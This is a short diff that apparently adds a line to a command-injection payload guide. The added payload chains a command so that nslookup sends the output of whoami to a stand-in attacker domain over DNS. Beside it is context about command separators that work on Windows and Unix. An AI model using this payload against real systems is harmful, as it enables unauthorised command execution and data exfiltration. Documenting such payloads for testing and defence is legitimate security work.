@@ -26,6 +26,9 @@ You can try to access directly, or save the file in the images and change a imag
 
 -Try nslookup to do a whoami to your host
 
+This payload will do a nslookup to your domain and display the content of the command whoami:
+& nslookup `whoami`.attacker.com & 
+
 
 The following command separators work on both Windows and Unix-based systems:
 
